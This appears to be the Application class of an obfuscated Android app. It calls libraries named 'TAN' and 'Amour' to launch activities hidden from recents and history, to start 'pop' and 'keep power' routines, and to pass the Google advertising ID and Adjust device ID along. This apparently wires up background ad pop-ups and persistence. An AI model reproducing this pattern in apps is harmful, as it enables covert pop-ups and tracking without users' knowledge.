package nwq

import android.app.Application
import android.content.Intent
import android.os.Bundle
import com.amour.Amour
import com.example.overseaswhitebag.common.utils.AdjustTokens
import com.p.b.base.BaseApplication
import com.p.b.base.OverseaAppInitializer.appBaseContext
import com.p.b.common.SPUtils
import com.p.b.common.adjust.AdJustTokenAFUtils
import com.tanout.TAN

class YQK : BaseApplication() {

    companion object {
        var isBackgroundLaunch: Boolean = false

        @JvmStatic
        var appInstance: YQK? = null
    }

    override fun onCreate() {
        super.onCreate()
        appInstance = this
    }

    override fun configureAdjustTokens() {
        AdjustTokens.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
        TAN.Tan(appBaseContext, intent, null as Class<*>?)

    }

    override fun initPopPower() {
        TAN.Init(appBaseContext)
    }

    override fun initKeepPower(app: Application) {
        Amour.Init(app,SPUtils.getGoogleAdId(), SPUtils.getAdjustDeviceId())
        AdJustTokenAFUtils.showBhInit(SPUtils.getGoogleAdId(),SPUtils.getAdjustDeviceId())
    }
}
